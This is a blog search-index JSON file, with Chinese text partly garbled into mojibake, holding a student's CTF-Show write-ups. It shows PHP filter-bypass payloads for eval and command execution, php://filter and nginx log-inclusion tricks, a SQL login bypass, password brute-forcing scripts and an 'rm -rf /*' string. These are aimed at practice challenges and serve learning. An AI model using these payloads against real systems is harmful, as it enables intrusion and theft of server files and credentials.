{"meta":{"title":"å¿† æ‰§ æ˜” æ¥ çš„ æ—… é€”","subtitle":"","description":"ç”Ÿæ´»æ˜æœ— ä¸‡ç‰©å¯çˆ± äººé—´å€¼å¾— æœªæ¥å¯æœŸ","author":"xizhi-future","url":"https://xizhi-future.github.io","root":"/"},"pages":[{"title":"ä¸ªäººä»‹ç»","date":"2021-10-15T09:47:19.508Z","updated":"2021-10-15T09:47:19.508Z","comments":true,"path":"about/index.html","permalink":"https://xizhi-future.github.io/about/index.html","excerpt":"","text":"è”ç³»æ–¹å¼ Emailï¼š&#x31;&#51;&#55;&#x30;&#x32;&#x32;&#48;&#x32;&#52;&#51;&#x40;&#x71;&#113;&#x2e;&#99;&#111;&#109; QQï¼š1370220243 ä¸ªäººä¿¡æ¯ 00å ç°å¤§å­¦æœ¬ç§‘ç”Ÿ ä¸ªäººåšå®¢ï¼šhttps://xizhi-future.github.io Githubï¼šhttps://github.com/xizhi-future æè¿° æœ¬äººçˆ±å¥½å¹¿æ³›ï¼Œç´æ£‹ä¹¦ç”»ã€å”±æ­Œè·³èˆæ ·æ ·å–œæ¬¢ï¼Œæ ·æ ·éƒ½ä¸ç²¾é€šï¼› ä¸€ä¸ªæ–‡é™çš„å¤–è¡¨ï¼Œä¸€ä¸ªå‘å¾€æŠ€æœ¯æµçš„å¿ƒï¼› è¯¥åšå®¢é‡Œå°†ä¼šæœ‰ä¸ªäººçš„è‡ªå­¦ç¬”è®°ï¼ŒåŒæ—¶ä¹Ÿå¯èƒ½ä¼šè®°å½•åœ¨ç”Ÿæ´»å½“ä¸­çš„ç‚¹ç‚¹æ»´æ»´ï¼› å¸Œæœ›å‚è§‚è¿‡æˆ‘åšå®¢çš„ç½‘å‹ä»¬å¯ä»¥äº’ç›¸äº¤æµï¼Œäº¤ä¸ªæœ‹å‹å‘€ï¼"},{"title":"éšç¬”","date":"2021-10-01T11:20:52.000Z","updated":"2021-10-01T12:30:28.737Z","comments":false,"path":"essayists/index.html","permalink":"https://xizhi-future.github.io/essayists/index.html","excerpt":"","text":"å½±è§†æœ‰æ„Ÿ ç”Ÿæ´»æ‚è°ˆ éŸ³ä¹åˆ†äº«"},{"title":"åˆ†ç±»","date":"2021-05-23T16:03:00.000Z","updated":"2021-10-01T10:14:53.628Z","comments":false,"path":"categories/index.html","permalink":"https://xizhi-future.github.io/categories/index.html","excerpt":"","text":""},{"title":"æ ‡ç­¾","date":"2021-05-23T16:09:40.000Z","updated":"2021-10-01T10:14:25.513Z","comments":false,"path":"tags/index.html","permalink":"https://xizhi-future.github.io/tags/index.html","excerpt":"","text":""},{"title":"éŸ³ä¹","date":"2021-10-15T09:20:28.000Z","updated":"2021-10-15T09:57:10.687Z","comments":false,"path":"playist/index.html","permalink":"https://xizhi-future.github.io/playist/index.html","excerpt":"","text":""}],"posts":[{"title":"CTF-Show-èŒæ–°è®¡åˆ’","slug":"CTF-Show-èŒæ–°è®¡åˆ’","date":"2021-11-19T07:17:08.000Z","updated":"2021-11-19T07:17:55.004Z","comments":true,"path":"2021/11/19/CTF-Show-èŒæ–°è®¡åˆ’/","link":"","permalink":"https://xizhi-future.github.io/2021/11/19/CTF-Show-%E8%90%8C%E6%96%B0%E8%AE%A1%E5%88%92/","excerpt":"","text":"CTF Show â€” èŒæ–°è®¡åˆ’Web 1-7 12345678&lt;?php//echo intval(&#x27;1000&#x27;);$a = $_GET[&#x27;a&#x27;];if(intval($a) &gt; 999 )&#123; echo &#x27;xxx&#x27;;&#125;else&#123; echo &#x27;success&#x27;;&#125; 123# è¿›åˆ¶è½¬æ¢0x38e #åå…­è¿›åˆ¶0b1111101000 # äºŒè¿›åˆ¶ 1234# å–å å¼‚æˆ– ä¸è¿ç®—~~1000200^800992|8 12345# è¿ç®—ç¬¦200*510/0.01--1000200%2b800 123# sql æ³¨å…¥?id=1 or 1=1id=id# 123?id=(1000)?id=&#x27;1000&#x27;?id=&quot;1000&quot; Web 11234567891011121314151617181920212223242526272829303132333435363738394041&lt;html&gt;&lt;head&gt; &lt;title&gt;ctf.showèŒæ–°è®¡åˆ’web1&lt;/title&gt; &lt;meta charset=&quot;utf-8&quot;&gt;&lt;/head&gt;&lt;body&gt;&lt;?php# åŒ…å«æ•°æ®åº“è¿æ¥æ–‡ä»¶include(&quot;config.php&quot;);# åˆ¤æ–­getæäº¤çš„å‚æ•°idæ˜¯å¦å­˜åœ¨if(isset($_GET[&#x27;id&#x27;]))&#123; $id = $_GET[&#x27;id&#x27;]; # åˆ¤æ–­idçš„å€¼æ˜¯å¦å¤§äº999 if(intval($id) &gt; 999)&#123; # id å¤§äº 999 ç›´æ¥é€€å‡ºå¹¶è¿”å›é”™è¯¯ die(&quot;id error&quot;); &#125;else&#123; # id å°äº 999 æ‹¼æ¥sqlè¯­å¥ $sql = &quot;select * from article where id = $id order by id limit 1 &quot;; echo &quot;æ‰§è¡Œçš„sqlä¸ºï¼š$sql&lt;br&gt;&quot;; # æ‰§è¡Œsql è¯­å¥ $result = $conn-&gt;query($sql); # åˆ¤æ–­æœ‰æ²¡æœ‰æŸ¥è¯¢ç»“æœ if ($result-&gt;num_rows &gt; 0) &#123; # å¦‚æœæœ‰ç»“æœï¼Œè·å–ç»“æœå¯¹è±¡çš„å€¼$row while($row = $result-&gt;fetch_assoc()) &#123; echo &quot;id: &quot; . $row[&quot;id&quot;]. &quot; - title: &quot; . $row[&quot;title&quot;]. &quot; &lt;br&gt;&lt;hr&gt;&quot; . $row[&quot;content&quot;]. &quot;&lt;br&gt;&quot;; &#125; &#125; # å…³é—­æ•°æ®åº“è¿æ¥ $conn-&gt;close(); &#125; &#125;else&#123; highlight_file(__FILE__);&#125;?&gt;&lt;/body&gt;&lt;!-- flag in id = 1000 --&gt;&lt;/html&gt; éœ€è¦æ»¡è¶³ intval($id) &lt;= 999 , ä½†åˆè¦ id = 1000 æµ‹è¯• 12?id=&quot;1000&quot;?id=&#x27;1000&#x27; å…¶å®ƒç»•è¿‡æ–¹å¼ï¼š 12345?id=0x3e8 # æ•°æ®åº“ä¸­æŸ¥è¯¢å¯ä½¿ç”¨ åå…­è¿›åˆ¶select * from article where id = 0x3e8 order by id limit 1?id=125&lt;&lt;3 # ä¸çŸ¥?id=680|320 # ä¸çŸ¥ Web 212?id=&quot;1000&quot;?id=&#x27;1000&#x27; Web 312?id=&quot;1000&quot;?id=&#x27;1000&#x27; Web 412?id=&quot;1000&quot;?id=&#x27;1000&#x27; Web 51if(preg_match(&quot;/\\&#x27;|\\&quot;|or|\\||\\-|\\\\\\|\\/|\\\\*|\\&lt;|\\&gt;|\\!|x|hex|\\(|\\)|\\+|select/i&quot;,$id)) è¿‡æ»¤å¼•å· å–åç»•è¿‡ 1?id=~~1000 å¼‚æˆ–ç»•è¿‡ 123450^0 = 01^0 = 10^1 = 11^1 = 0å³åŒä¸ºå‡ï¼Œå¼‚ä¸ºçœŸ 1?id= äºŒè¿›åˆ¶ç»•è¿‡ 1?id=0b1111101000 # 0b å¼€å¤´è¡¨ç¤ºäºŒè¿›åˆ¶ Web 61if(preg_match(&quot;/\\&#x27;|\\&quot;|or|\\||\\-|\\\\\\|\\/|\\\\*|\\&lt;|\\&gt;|\\^|\\!|x|hex|\\(|\\)|\\+|select/i&quot;,$id)) 1?id=0b1111101000 # 0b å¼€å¤´è¡¨ç¤ºäºŒè¿›åˆ¶ Web 71if(preg_match(&quot;/\\&#x27;|\\&quot;|or|\\||\\-|\\\\\\|\\/|\\\\*|\\&lt;|\\&gt;|\\^|\\!|\\~|x|hex|\\(|\\)|\\+|select/i&quot;,$id)) 1?id=0b1111101000 # 0b å¼€å¤´è¡¨ç¤ºäºŒè¿›åˆ¶ Web 8 â€” ?flag=rm -rf /*123456789101112131415161718192021222324&lt;html&gt;&lt;head&gt; &lt;title&gt;ctf.showèŒæ–°è®¡åˆ’web1&lt;/title&gt; &lt;meta charset=&quot;utf-8&quot;&gt;&lt;/head&gt;&lt;body&gt;&lt;?php# åŒ…å«æ•°æ®åº“è¿æ¥æ–‡ä»¶,key flag ä¹Ÿåœ¨é‡Œé¢å®šä¹‰include(&quot;config.php&quot;);# åˆ¤æ–­getæäº¤çš„å‚æ•°idæ˜¯å¦å­˜åœ¨if(isset($_GET[&#x27;flag&#x27;]))&#123; if(isset($_GET[&#x27;flag&#x27;]))&#123; $f = $_GET[&#x27;flag&#x27;]; if($key===$f)&#123; echo $flag; &#125; &#125;&#125;else&#123; highlight_file(__FILE__);&#125;?&gt;&lt;/body&gt;&lt;/html&gt; 1?flag=rm -rf /* Web 91234567891011121314&lt;?php# flag in config.phpinclude(&quot;config.php&quot;);if(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(preg_match(&quot;/system|exec|highlight/i&quot;,$c))&#123; eval($c); &#125;else&#123; die(&quot;cmd error&quot;); &#125;&#125;else&#123; highlight_file(__FILE__);&#125;?&gt; 12?c=highlight_file(&#x27;config.php&#x27;);?c=system(&#x27;cat config.php&#x27;); Web 101234567891011121314&lt;?php# flag in config.phpinclude(&quot;config.php&quot;);if(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/system|exec|highlight/i&quot;,$c))&#123; eval($c); &#125;else&#123; die(&quot;cmd error&quot;); &#125;&#125;else&#123; highlight_file(__FILE__);&#125;?&gt; 123?c=show_source(&#x27;config.php&#x27;);?c=$a=&#x27;sys&#x27;;$b=&#x27;tem&#x27;;$d=$a.$b;$d(&#x27;cat config.php&#x27;);?c=passthru(&#x27;cat config.php&#x27;); Web 111234567891011121314&lt;?php# flag in config.phpinclude(&quot;config.php&quot;);if(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/system|exec|highlight|cat/i&quot;,$c))&#123; eval($c); &#125;else&#123; die(&quot;cmd error&quot;); &#125;&#125;else&#123; highlight_file(__FILE__);&#125;?&gt; 123?c=show_source(&#x27;config.php&#x27;);?c=$a=&#x27;sys&#x27;;$b=&#x27;tem&#x27;;$d=$a.$b;$d(&#x27;tac config.php&#x27;);?c=passthru(&#x27;tac config.php&#x27;); Web 121234567891011121314&lt;?php# flag in config.phpinclude(&quot;config.php&quot;);if(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/system|exec|highlight|cat|\\.|php|config/i&quot;,$c))&#123; eval($c); &#125;else&#123; die(&quot;cmd error&quot;); &#125;&#125;else&#123; highlight_file(__FILE__);&#125;?&gt; 12345?c=passthru(&#x27;tac confi*&#x27;);?c=passthru(&#x27;tac con&quot;&quot;fig*&#x27;);?c=passthru(&#x27;tac con\\fig*&#x27;);?c=$a=base64_decode(&quot;c3lzdGVt&quot;);$b=base64_decode(&quot;Y2F0IGNvbmZpZy5waHA=&quot;);$a($b);#system(&#x27;cat config.php&#x27;); Web 13 â€” è¿‡æ»¤ ï¼›1234567891011121314&lt;?php# flag in config.phpinclude(&quot;config.php&quot;);if(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/system|exec|highlight|cat|\\.|\\;|file|php|config/i&quot;,$c))&#123; eval($c); &#125;else&#123; die(&quot;cmd error&quot;); &#125;&#125;else&#123; highlight_file(__FILE__);&#125;?&gt; è¿‡æ»¤äº† åˆ†å· ; 1234# include + ä¼ªåè®®?c=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=config.php# ?&gt; é—­åˆ?c=passthru(&#x27;tac con\\fig*&#x27;)?&gt; Web 141234567891011121314&lt;?php# flag in config.phpinclude(&quot;config.php&quot;);if(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/system|exec|highlight|cat|\\(|\\.|\\;|file|php|config/i&quot;,$c))&#123; eval($c); &#125;else&#123; die(&quot;cmd error&quot;); &#125;&#125;else&#123; highlight_file(__FILE__);&#125;?&gt; 1234# include + ä¼ªåè®®?c=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=config.php?c=echo `$_GET[a]`?&gt;&amp;a=tac config.php Web 15 â€” è¿‡æ»¤ ?1234567891011121314&lt;?php# flag in config.phpinclude(&quot;config.php&quot;);if(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/system|\\\\*|\\?|\\&lt;|\\&gt;|\\=|exec|highlight|cat|\\(|\\.|file|php|config/i&quot;,$c))&#123; eval($c); &#125;else&#123; die(&quot;cmd error&quot;); &#125;&#125;else&#123; highlight_file(__FILE__);&#125;?&gt; è¿‡æ»¤é—®å· ? 12?c=echo `$_GET[a]`;&amp;a=tac config.php?c=include$_GET[1];&amp;1=php://filter/read=convert.base64-encode/resource=config.php Web 161234567891011121314&lt;?php# flag in config.phpinclude(&quot;config.php&quot;);if(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(md5(&quot;ctfshow$c&quot;)===&quot;a6f57ae38a22448c2f07f3f95f49c84e&quot;)&#123; echo $flag; &#125;else&#123; echo &quot;nonono!&quot;; &#125;&#125;else&#123; highlight_file(__FILE__);&#125;?&gt; è„šæœ¬ï¼š 123456789import hashlibstr1=&#x27;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;for i in str1: for j in str1: for k in str1: s = hashlib.md5((&#x27;ctfshow&#x27;+i+j+k).encode()).hexdigest() #print(type(s)) if s==&#x27;a6f57ae38a22448c2f07f3f95f49c84e&#x27;: print(i+j+k) å¾—åˆ° 36d 1?c=36d Web 17-21 â€” æ—¥å¿—åŒ…å«12345678910&lt;?phpif(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/php/i&quot;,$c))&#123; include($c); &#125;&#125;else&#123; highlight_file(__FILE__);&#125;?&gt; æ—¥å¿—åŒ…å« 1?c=/var/log/nginx/access.log Web 1812345678910&lt;?phpif(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/php|file/i&quot;,$c))&#123; include($c); &#125;&#125;else&#123; highlight_file(__FILE__);&#125;?&gt; å¯†ç 1å¯†æ–‡ï¼š 53316C6B5A6A42684D3256695A44566A4E47526A4D5459774C5556375A6D49324D32566C4D4449354F4749345A6A526B4F48303D åå…­è¿›åˆ¶åˆ°æ–‡æœ¬å­—ç¬¦ä¸² å† base64 è§£ç  KYdf0a3ebd5c4dc160-E{fb63ee0298b8f4d8} æ …æ å¯†ç è§£ç  å¯†ç 2å‡ºé¢˜äººå·²ç´¯ï¼Œéšä¾¿æ•²äº†å‡ ä¸‹é”®ç›˜ã€‚ã€‚ã€‚ rdcvbg 2qase3 6tghu7 rdcvbg 2qase3 6tghu7 â€‹ f w y ä¸‰ç»„ï¼ŒåŒ…å›´ KEY{fwy} å¯†ç 3é¢˜ç›®åç§°ï¼šæˆ‘æƒ³åƒåŸ¹æ ¹ é¢˜ç›®æè¿°ï¼š â€“ â€” .-. â€¦ . ..â€“.- .. â€¦ ..â€“.- -.-. â€” â€” .-.. ..â€“.- -â€¦ ..- - ..â€“.- -â€¦ .- -.-. â€” -. ..â€“.- .. â€¦ ..â€“.- -.-. â€” â€” .-.. . .-. ..â€“.- â€“ â€“ -.. -.. â€“ -.. â€“ -.. â€“ â€“ â€“ -.. -.. -.. /â€“ -.. â€“ -.. -.. â€“/ â€“ â€“ â€“ â€“ â€“ /â€“ -.. -.. â€“ -.. â€“ /â€“ -.. -.. â€“ æ ¼å¼ï¼šflag{***********} æ‘©æ–¯å¯†ç è§£å¯† å¾—åˆ° mmddmdmdmmmdddmdmddmmmmmmmddmdmmddm å°† m æ›¿æ¢æˆ Aï¼Œd æ›¿æ¢æˆ B ï¼ŒAABBABABAAABBBABABBAAAAAAABBABAABBA åŸ¹æ ¹å¯†ç è§£å¯† å¯†ç #4QW8obWdIWF5FKUFSQW5URihKXWZAJmx0OzYiLg== base64 å¾—åˆ° Ao(mgHX^E)ARAnTF(J]f@&lt;6â€. ç„¶å base85 éšå†™1ä¸‹è½½åˆ°æœ¬åœ°ï¼Œæ‰“ä¸å¼€ 010 æŸ¥çœ‹ï¼Œæ–‡ä»¶å¤´æŸå æ›´æ”¹ä¸º 89 åä¿å­˜ï¼Œæ‰“å¼€å³å¯ éšå†™2ä¸‹è½½å·¥å…·ï¼Œæ‰“å¼€å›¾ç‰‡ï¼Œç‚¹å‡» Seek ï¼Œå¯†ç ä¸ºç©ºï¼Œä¿å­˜ï¼Œå¾—åˆ°æ‰€è§£å‡ºçš„å¯†æ–‡ èŒæ–° éšå†™2 â€” zip ä¼ªåŠ å¯† ziperello æš´åŠ›ç ´è§£ zip ä¼ªåŠ å¯† ziperello å·¥å…· ä¼ªåŠ å¯†æ˜¯09ï¼Œè¿™é‡Œæ˜¯01ï¼Œæ˜¯çœŸæœ‰å¯†ç ã€‚ èŒæ–° éšå†™3 èŒæ–° éšå†™4 â€” .doc æ‰“å¼€ä¹‹åï¼Œå¯ä»¥çœ‹è§å­˜åœ¨æ¢è¡Œï¼Œåœ¨ word é€‰é¡¹ä¸­è®¾ç½® æ˜¾ç¤ºéšè—æ–‡å­— èŒæ–° éšå†™51ä´€å¨€åœ€äœ€äŒ€å¨€å¨€ä¤€ä¸€äˆ€å„€åœ€ã˜€å €ãŒ€ä¬€ä¸€ä˜€ãˆ€å˜€ã˜€å¤€å€å˜€ä°€ã”€ã€åœ€ã˜€ãŒ€å€ä €ä°€ã”€åˆ€ä€äœ€ä´€åŒ€ãœ€ä˜€ä”€ã´€ã´€ã´€ã´€ã´€ã´€\\\\=ã€‚=// MZWGCZZINBQW6X3KNF2V6YTVL54W63THL5RDGMS7FE====== base32 èŒæ–°6 â€” .flac éŸ³é¢‘ â€” audacity å·¥å…· å·¦å£°é“ æ ·å­åƒ æ‘©æ–¯ç”µç  å°†å³å£°é“è®¾ç½®ä¸ºé™éŸ³ï¼Œæé«˜éŸ³é‡ï¼Œå¯¼å‡ºä¸º Mp3 æ‰“å¼€ æ‘©æ–¯ç”µç éŸ³é¢‘è§£ç å·¥å…· æœ‰è¯¯å·® ï¼Œç­”æ¡ˆæ˜¯ flag{MUZIKISG00D} æ‚é¡¹1å°æ˜æƒ³ç»™å¿ƒçˆ±çš„å¦¹å­è¡¨ç™½å¾ˆä¹…ï¼Œå¯æ˜¯ä¸çŸ¥é“æ€ä¹ˆå¼€å£ï¼Œä½ èƒ½å¸®å¸®å°æ˜å—ï¼Ÿ å·²çŸ¥ md5(è¡¨ç™½çš„è¯+ctf)=ed400fbcff269bd9c65292a97488168a æäº¤flag{è¡¨ç™½çš„è¯} https://cmd5.la/user/index.php æ‚é¡¹2 èŒæ–° æ‚é¡¹3å¤§å®¶å¥½æˆ‘æ˜¯å°èŒæ–°ç¾½ï¼Œå‰ä¸ä¹…æˆ‘çš„ä¸€ä¸ªæœ‹å‹ç»™æˆ‘äº†ä¸€å¼ é“¶è¡Œå¡ï¼Œä»–è¯´é‡Œé¢æœ‰ä¸€å¤§ç¬”é’±ï¼Œä½†æ˜¯ä»–åªå‘Šè¯‰æˆ‘ä»–çš„ç”Ÿæ—¥æ˜¯ä¹ä¸ƒå¹´åæœˆä¸€æ—¥ï¼Œä½ èƒ½å¸®æˆ‘çŒœçŒœä»–çš„é“¶è¡Œå¡å¯†ç æ˜¯å¤šå°‘å—ï¼Œå“¦å¯¹ï¼Œè¿™ä¸ªæœ‹å‹æœ‰ä¸ªå°åå«å°äº”ã€‚ flagæ ¼å¼ï¼šflag{é“¶è¡Œå¡å¯†ç } flag{971015} æ‚é¡¹4å°æ˜å¿ƒçˆ±çš„å›¾ç‰‡åœ¨å‹ç¼©åŒ…ä¸­ï¼Œå¯æ˜¯å°æ˜å¤œæ·±äººé™çš„æ—¶å€™ï¼Œå­¤æ•éš¾çœ ï¼Œæƒ³æ‰“å¼€å›¾ç‰‡æ’é£å¯‚å¯ï¼Œå¯æ˜¯å¿˜è®°äº†å¯†ç äº†ï¼Œå°ç±³ä¾ç¨€è®°å¾—9ä½çš„å¯†ç éƒ½æ˜¯æ•°å­—ï¼Œå‰3ä½æ˜¯372ï¼Œä½ èƒ½å¸®åŠ©å°æ˜å—ï¼Ÿ zip å‹ç¼©åŒ… ziperello ç›´æ¥çˆ†ç ´å¾—åˆ°å¯†ç  ARCHPR æ©ç  æ‚é¡¹5å°æ˜å¦‚æ„¿ä»¥å¿çš„æ‰“å¼€äº†å‹ç¼©åŒ…ï¼Œå¯æ˜¯çœ¼å‰çš„æ–‡å­—è‡ªå·±åªèƒ½è®¤è¯†FBIï¼Œå…¶ä»–çš„éƒ½ä¸è®¤è¯†ï¼Œè€Œä¸”å±å¹•å‡ºç°äº†ä¸€å¥è¯ï¼Œä½ èƒ½å¸®å°æ˜æ‰¾åˆ°è¿™å¥è¯çš„æ„æ€å—ï¼Ÿ æ‚é¡¹6å°æ˜çš„å‹ç¼©åŒ…åˆå¿˜è®°å¯†ç äº†ï¼Ÿä»–å»ç”µè„‘ç»´ä¿®åº—å»ä¿®ï¼Œäººå®¶æ‰”å‡ºæ¥è¯´è¿™ä¸ªæ ¹æœ¬å°±æ²¡æœ‰å¯†ç ï¼Œæ˜¯ä¸ªå‡å¯†ç ã€‚å°æ˜æ‡µäº†ï¼Œæ˜æ˜æœ‰å¯†ç çš„å•Šï¼Œä½ èƒ½å¸®å¸®å°æ˜å—ï¼Ÿ ä¼ªåŠ å¯† ï¼Œå°† 09 æ›¿æ¢æˆ 00 æ‚é¡¹7å°æ˜å°å¿ƒç¿¼ç¿¼çš„æ‰“å¼€å‹ç¼©åŒ…ï¼Œç«Ÿç„¶æ˜¯ä¸ªå›¾ç‰‡ï¼Œä»€ä¹ˆé¬¼ï¼Ÿ è¦æ˜¯å›¾ç‰‡èƒ½ç»§ç»­å¾€é•¿ä¸€ç‚¹è¯¥å¤šå¥½å•Šï¼Œå°æ˜æš—æš—çš„æƒ³ã€‚ ä½ èƒ½å¸®å°æ˜å®Œæˆè¿™ä¸ªæœ´ç´ çš„æ¢¦æƒ³å—ï¼Ÿ å›¾ç‰‡ SRC è®¡ç®—å›¾ç‰‡æ­£ç¡®çš„å®½å’Œé«˜ è„šæœ¬ 12345678910111213141516import structimport binasciiimport os m = open(&quot;flag.png&quot;,&quot;rb&quot;).read()k=0for i in range(5000): if k==1: break for j in range(5000): c = m[12:16] + struct.pack(&#x27;&gt;i&#x27;, i) + struct.pack(&#x27;&gt;i&#x27;, j)+m[24:29] crc = binascii.crc32(c) &amp; 0xffffffff if crc == 0x889C2F07: k = 1 print(hex(i),hex(j)) break æ‚é¡¹812345678910111213141516import structimport binasciiimport os m = open(&quot;flag.png&quot;,&quot;rb&quot;).read()k=0for i in range(5000): if k==1: break for j in range(5000): c = m[12:16] + struct.pack(&#x27;&gt;i&#x27;, i) + struct.pack(&#x27;&gt;i&#x27;, j)+m[24:29] crc = binascii.crc32(c) &amp; 0xffffffff if crc == 0x889C2F07: k = 1 print(hex(i),hex(j)) break å’Œæ‚é¡¹7ä¸€æ ·ï¼Œä¿®æ”¹æ­£ç¡®çš„å®½é«˜ æ‚é¡¹9 â€” é“¾æ¥å¤±æ•ˆ â€” è¿‡é¢˜ç›®åœ°å€ï¼š é“¾æ¥: https://pan.baidu.com/s/1XqF-OyHbH5WHFEUJvVZPEA æå–ç : fcg3 è¦æ±‚ï¼šå†™ä¸€ä¸ªæœ¬åœ°å¤–æŒ‚ï¼Œå°åœ°å›¾æ˜¾ç¤ºå…¨å›¾ã€‚ æç¤ºï¼šæ¸¸æˆç‰ˆæœ¬1.24Eï¼Œä¿®æ”¹game.dll æäº¤å°åœ°å›¾å…¨å›¾åŸºå€å³å¯ã€‚ä¾‹å¦‚ï¼šflag{0xxxxxxx} æ‚é¡¹10 æ‘˜æ‰çœ¼é•œï¼Œä»”ç»†çœ‹å›¾ç‰‡ flag{æˆ‘å¥½å–œæ¬¢ä½ } æ‚é¡¹11å¯†ç ä¸ºç©ºï¼Œæå–æ–‡ä»¶å¾—åˆ° 1.jpgï¼Œä¸€ä¸ªäºŒç»´ç  ä½¿ç”¨ äºŒç»´ç æ‰«æå·¥å…·æ‰«æï¼Œå¾—åˆ° base64 è§£ç å¾—åˆ°","categories":[{"name":"CTF Show","slug":"CTF-Show","permalink":"https://xizhi-future.github.io/categories/CTF-Show/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://xizhi-future.github.io/tags/CTF/"}],"author":"xizhi-future"},{"title":"CTF-Show-é»‘ç›’æµ‹è¯•","slug":"CTF-Show-é»‘ç›’æµ‹è¯•","date":"2021-11-19T07:14:09.000Z","updated":"2021-11-19T07:15:45.222Z","comments":true,"path":"2021/11/19/CTF-Show-é»‘ç›’æµ‹è¯•/","link":"","permalink":"https://xizhi-future.github.io/2021/11/19/CTF-Show-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/","excerpt":"","text":"ä¸€ã€é»‘ç›’æµ‹è¯•1.1 Web 380æ‰«ç›®å½•å¯ä»¥å‘ç° å°è¯• ?id=2 å¯ä»¥çœ‹åˆ°æ˜¯ file_get_contents é‚£ ?id=flag å°è¯• ï¼ŒæŸ¥æºç å¾—åˆ° 1.2 Web 381 å¯ä»¥çœ‹åˆ°è¿™é‡Œä¸ä¹‹å‰ä¸åŒï¼Œä½†æ˜¯å°è¯•è®¿é—®è¿‡åï¼Œä¾æ—§ä¸è¡Œ é‚£ç»§ç»­æ‰«ï¼Œå‘ç°ï¼Œä»ç„¶å¾—åˆ°äº† page.php 123?id=12 3 4# å‘ç°å¯¹åº”çš„æ˜¯æ¯ä¸€ç¯‡æŠ¥é“ ä¾æ¬¡è®¿é—®ï¼Œæœ€ç»ˆæ— æ‰€è·ï¼Œä¸”å°è¯•è¿‡å page_flag.php åº”è¯¥ä¹Ÿæ˜¯ä¸å­˜åœ¨çš„ åˆå›åˆ°æœ€åˆå‘ç°çš„åŸå¯†ç ç›®å½•ï¼Œå†æ¬¡å°è¯•ï¼ŒæˆåŠŸ 1.3 Web 382-383è¿™æ¬¡å†ç›´æ¥è®¿é—®è¿‡åï¼Œå°±æ˜¯ç™»å½•é¡µé¢ SQL ä¸‡èƒ½å¯†ç  1username: admin&#x27;or&#x27;1&#x27;=&#x27;1 å¯†ç çˆ†ç ´ 1.4 Web 3841å¯†ç å‰2ä½æ˜¯å°å†™å­—æ¯ï¼Œåä¸‰ä½æ˜¯æ•°å­— ä¸‡èƒ½å¯†ç ä¸å¯è¡Œï¼Œåªèƒ½æ ¹æ®é¢˜ç›®è¿›è¡Œçˆ†ç ´ 1234str = &#x27;abcdefghigklmnopqrstuvwxyz&#x27;for i in str: for j in str: print(i,j) 1.5 Web 385åŒæ ·æœ‰åå°ç™»å½•ï¼Œä½†æ˜¯å¯†ç ä¹Ÿæ²¡æœ‰æç¤ºï¼Œæˆ‘ä»¬å…ˆä¸è¿›è¡Œçˆ†ç ´ æ‰«ç›®å½•ï¼Œæœ‰æ–°çš„å‘ç° è¯æ˜æˆ‘ä»¬å·²ç»é‡ç½®äº†å¯†ç ï¼Œé‚£ä¹ˆ æ‰€è°“çš„ é»˜è®¤å¯†ç æ˜¯å¤šå°‘å‘¢ï¼Ÿ ä¸ç®¡æ˜¯å¤šå°‘ï¼Œè‚¯å®šæ˜¯å¼±å¯†ç ï¼Œæˆ‘ä»¬å¯ä»¥å†è¿›è¡Œçˆ†ç ´ï¼Œä¹Ÿå¯ä»¥ç»“åˆä¹‹å‰æ‰€çˆ†ç ´å‡ºæ¥çš„å¯†ç å°è¯• 1admin888 1.6 Web 386è¯´æ˜¯æ‰«å‡ºæ¥çš„ clear.php ï¼Œä½†æ˜¯æˆ‘ dirsearch æ²¡æœ‰æ‰«å‡ºæ¥ï¼Œè¯´ç™½äº†ï¼Œè¿˜æ˜¯å­—å…¸ä¸å¤Ÿå¼ºå¤§ ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬éœ€è¦é¦–å…ˆæ¸…é™¤æ‰ lock.dat 1/clear.php?file=./install/lock.dat æ¸…ç†æˆåŠŸä¹‹åå†æ¬¡åƒä¸Šä¸€å…³é‚£æ ·å°±å¥½äº† 1.7 Web 3871å‰é¢éƒ¨åˆ†å’Œ386ä¸€æ · è¯´æ˜¯å’Œä¸Šä¸€å…³ä¸€æ ·ï¼Œä½†æ˜¯è¿™æ¬¡åˆ ä¸äº†ï¼Œæˆ‘ä»¬ç»§ç»­æ‰«ç›®å½• çœ‹æ¥ robots.txt ä¹Ÿæ˜¯ç”¨æ¥æç¤ºæˆ‘ä»¬ /debug/ çš„ å°è¯•ä¼ é€’å‚æ•°è¯•è¯• 123?file=php://filter/resource=flag.php?file=/flag#ç­‰ç­‰éƒ½æŸ¥ä¸å‡ºæ¥ é‚£ä¹ˆï¼Œè¿›è¡Œæ—¥å¿—åŒ…å« 1?file=/var/log/nginx/access.log ç„¶åæŠ“åŒ…ä¿®æ”¹ï¼Œå†™å…¥å‘½ä»¤ åªåœ¨å½“å‰é¡µé¢å‘ç°äº†ä¸€ä¸ª index.php 12345678910111213141516171819/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2021-01-09 15:26:15# @Last Modified by: h1xa# @Last Modified time: 2021-01-09 15:30:48# @email: h1xa@ctfer.com# @link: https://ctfer.com*/error_reporting(0);if(isset($_GET[&#x27;file&#x27;]))&#123; $html = shell_exec(&#x27;php -f &#x27;.$_GET[&#x27;file&#x27;]); echo $html;&#125;else&#123; echo &#x27;file not exist&#x27;;&#125;&quot; 